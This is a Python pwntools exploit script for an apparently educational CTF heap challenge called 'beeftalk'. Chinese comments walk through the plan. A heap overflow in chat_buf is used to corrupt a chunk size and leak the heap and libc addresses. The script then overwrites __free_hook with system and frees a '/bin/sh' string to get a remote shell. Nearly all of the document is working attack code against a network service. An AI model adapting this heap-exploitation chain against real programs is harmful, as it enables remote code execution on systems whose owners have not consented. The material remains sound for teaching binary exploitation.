from pwn import *
from utils import *


context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']



r= remote("edu-ctf.zoolab.org", 30207)

# r = process("./beeftalk")

'''
-----------------------------------------------
目標: get heap base address
方法：
首先觀察可以發現 signup 裡面初始化的部份, 除了name都是readstr,都會放null在字串後面
所以如果我們想利用allocate就的chunk得到leak heap address的效果,只有name能用
但是name超過0x20的話想要多大的chunk就要寫入多少個A,基本上就會把我們要的address都給蓋掉
我們想要讓User的這個chunk的size變成0x30,free掉之後會有許多address殘留在上面(
name,desc,job,fifo0,fifo1)
然後新增user2,user2->name寫入8個A,讓user2->name是0x20的size,所以會取得上面所講的那一塊user
此時就會變成 AAAAAAAA_address_of_desc_user1
在讓user2 print出name,就可以得到_address_of_desc_user1
-----------------------------------------------
purpose: 我們想要讓一塊allocated的User的size被改成0x30,在free掉,讓這塊User之後可以被其他User可以用
user->name = malloc(0x20) 的方式取得

方法：用heap overflow來改： 觀察 line 240可以發現chat_buf有heap overflow
可以拿來改chat_buf的下面那塊chunk的size
'''
# 先創出一塊0x110大小的chunk,讓chat_buf之後可以取得這塊,改這一快下面的chunk
tok1,_ = signup(r,b"A"*0x100,keep = "y")

# 這塊就是要被改的user
tok2,_ = signup(r,b"A"*0x3,keep = "y")
tok3,_ = signup(r,b"A"*0x100,keep = "y")
# free掉,使之後chat_buf可以取得
delete_account(r,tok1)

chat_client(r,tok3,b"B"*6 + p64(0x31))

delete_account(r,tok2)
tok4,userInfo = signup(r,b"A"*0x10,keep = "y")
heap = userInfo.split(b'\n')[1][-6:].ljust(8,b"\x00")
heap = u64(heap) - 0x5a0
print("heap:",hex(heap))


delete_account(r,tok3)
# delete_account(r,tok4)

# get libc    
tokenList = []
for i in range(7):
    token,_ = signup(r,b"A"*0x100,keep = "y")
    tokenList.append(token)
for i in range(7):
    delete_account(r,tokenList[i]) 

# token_controlled = tokenList[0]

# chat_client(r,token_controller)
controller_token,_ = signup(r,b"A"*40,keep = "y") # users[1]
controlled_token = tokenList[2] # users[3]
update_user(r,controller_token,Desc= p64(heap+0xcf8)[:-1])
text = login_doNothing(r,controlled_token)
libc = text.split(b'\n')[1][6:6+6].ljust(8,b"\x00")
print("libc:",libc)
offset =  0x7ff445332be0 - 0x7ff445147000 
libc = u64(libc) - offset
print("libc:",hex(libc))


_system = libc + 0x55410
__free_hook = libc + 0x1eeb28

update_user(r,controller_token,Name = b'/bin/sh\x00', Desc = p64(__free_hook) + p64(heap+0xb90)[:-1]) 

update_user(r,controlled_token,Name = p64(_system)) 
delete_account(r,controller_token)

# chat
# signup(b"A",keep = "n")
# signup(b"dummy",keep = "y")
# token = signup(b"user1",keep = "y")


r.interactive()

    



# login()

# token = signup(b"A"*0x410,b"dummy",b"dummy")


